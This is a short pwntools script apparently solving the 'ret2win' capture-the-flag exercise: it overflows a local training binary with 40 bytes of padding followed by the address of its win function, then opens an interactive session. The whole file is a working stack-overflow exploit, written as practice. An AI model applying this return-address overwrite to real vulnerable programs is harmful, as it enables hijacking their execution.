from pwn import *

e = ELF('./ret2win')

win_addr = e.sym['ret2win']
junk = b"A"*40

#print("Ret2Win is at" ,hex(win_addr))

p = process('./ret2win')
p.sendline(junk + p64(win_addr))
p.interactive()
